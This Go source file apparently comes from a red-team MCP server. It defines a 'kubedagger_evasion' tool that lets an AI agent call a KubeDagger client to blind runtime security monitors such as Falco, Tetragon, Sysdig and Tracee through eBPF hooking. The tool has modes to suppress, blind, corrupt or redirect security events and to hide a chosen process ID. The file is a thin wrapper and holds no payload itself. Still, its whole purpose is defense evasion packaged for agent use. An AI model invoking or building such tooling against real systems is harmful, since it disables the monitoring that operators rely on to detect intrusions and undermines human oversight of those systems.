package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type EvasionInput struct {
	Target string `json:"target"`
	Mode   string `json:"mode,omitempty"`
	PID    int    `json:"pid,omitempty"`
	Scope  string `json:"scope,omitempty"`
}

type EvasionTool struct {
	exec executor.Executor
}

func NewEvasion(exec executor.Executor) *EvasionTool {
	return &EvasionTool{exec: exec}
}

func (t *EvasionTool) Name() string { return "kubedagger_evasion" }

func (t *EvasionTool) Description() string {
	return "Evade runtime security tools (Falco, Tetragon, Sysdig) by hooking their eBPF programs and filtering events before they reach userspace. Suppresses syscall monitoring, file integrity checks, and network activity alerts."
}

func (t *EvasionTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"target": {
				"type": "string",
				"enum": ["falco", "tetragon", "sysdig", "tracee", "all"],
				"description": "Security tool to evade"
			},
			"mode": {
				"type": "string",
				"enum": ["suppress", "blind", "corrupt", "redirect"],
				"description": "Evasion mode: suppress events, blind the tool, corrupt data, or redirect to decoy"
			},
			"pid": {
				"type": "integer",
				"description": "Process ID to hide from monitoring"
			},
			"scope": {
				"type": "string",
				"enum": ["process", "network", "file", "all"],
				"description": "Category of events to suppress"
			}
		},
		"required": ["target"]
	}`)
}

func (t *EvasionTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input EvasionInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	args := []string{"evasion", "--target", input.Target}
	if input.Mode != "" {
		args = append(args, "--mode", input.Mode)
	}
	if input.PID > 0 {
		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
	}
	if input.Scope != "" {
		args = append(args, "--scope", input.Scope)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger evasion failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Evasion: %s\n\n", input.Target)
	if output == "" {
		sb.WriteString("Evasion active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
